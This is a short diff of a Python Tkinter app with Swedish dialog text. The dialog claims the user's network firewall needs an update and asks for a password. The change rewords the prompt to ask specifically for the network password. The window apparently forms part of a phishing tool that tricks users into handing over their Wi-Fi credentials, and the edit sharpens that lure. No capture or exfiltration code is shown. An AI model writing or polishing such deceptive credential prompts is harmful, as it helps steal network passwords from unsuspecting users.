@@ -41,7 +41,7 @@ class App():
         self.descLabel = Label(self.topFrame,
                                text="""Brandväggen för ditt nätverk behöver uppdateras,\nsenast uppdaterad den 10e april 2017.""")
         self.descTwoLabel = Label(self.topFrame,
-                                  text="""För att fortsätta så krävs det att du angiver\nlösenordet nedan.""")
+                                  text="""För att fortsätta så krävs det att du angiver\nlösenordet för ditt nätverk nedan.""")
 
         self.passwordLabel = Label(self.topFrame,
                                    text="""Lösenord:""",
